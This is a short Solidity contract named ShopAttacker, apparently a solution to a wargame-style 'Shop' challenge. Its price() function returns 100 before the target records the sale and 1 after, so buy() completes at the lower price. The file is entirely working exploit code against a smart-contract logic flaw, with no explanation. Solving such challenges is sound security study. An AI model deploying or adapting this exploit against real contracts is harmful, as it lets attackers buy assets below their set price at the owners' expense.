// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ShopAttacker {
    address target;
    bool tmp;
    constructor(address _target) {
        target = _target;
    }
    function attack() public {
      (bool success, ) = target.call(abi.encodeWithSignature("buy()"));
      require(success, "Transaction failed");
    }

    function price() external view returns (uint _price) {
        (, bytes memory returnData) = target.staticcall(abi.encodeWithSignature("isSold()"));
        bool isSold = abi.decode(returnData, (bool));
        _price = isSold ? 1 : 100;
    }
}